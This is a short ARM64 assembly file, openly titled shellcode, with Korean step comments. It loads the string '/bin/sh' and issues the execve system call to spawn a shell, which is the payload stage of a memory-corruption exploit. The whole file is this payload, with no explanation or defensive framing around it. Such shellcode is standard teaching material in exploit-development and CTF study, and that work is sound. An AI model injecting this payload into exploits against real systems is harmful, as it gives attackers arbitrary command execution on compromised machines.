// shellcode.s
// ARM64 execve("/bin/sh", NULL, NULL)

.global _start
.text

_start:
    // 1. 준비: x0 = filename 주소
    adrp    x0, binsh@PAGE    // x0 = 페이지 베이스
    add     x0, x0, binsh@PAGEOFF // x0 += 오프셋

    // 2. 준비: x1 = argv = NULL
    mov     x1, xzr

    // 3. 준비: x2 = envp = NULL
    mov     x2, xzr

    // 4. syscall: execve
    mov     x8, #221          // execve syscall number (AArch64)
    svc     #0

binsh:
    .asciz  "/bin/sh"

